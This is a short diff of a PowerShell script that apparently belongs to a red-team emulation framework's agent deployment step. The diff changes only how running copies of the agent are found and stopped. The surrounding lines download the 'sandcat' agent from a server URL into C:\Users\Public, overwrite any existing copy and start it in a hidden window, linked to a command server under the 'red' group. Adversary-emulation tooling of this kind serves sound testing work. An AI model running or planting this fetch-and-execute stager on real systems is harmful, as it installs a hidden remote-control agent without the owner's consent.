@@ -30,7 +30,7 @@
           $wc.Headers.add("file","sandcat.go");
           $data=$wc.DownloadData($url);
           $name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");
-          get-process | ? {$_.modules.filename -like "C:\Users\Public\$name.exe"} | stop-process -f;
+          Get-Process | Where-Object {$_.Path -like "C:\Users\Public\$name.exe"} | stop-process -f -ea ignore;
           rm -force "C:\Users\Public\$name.exe" -ea ignore;
           [io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data) | Out-Null;
           Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
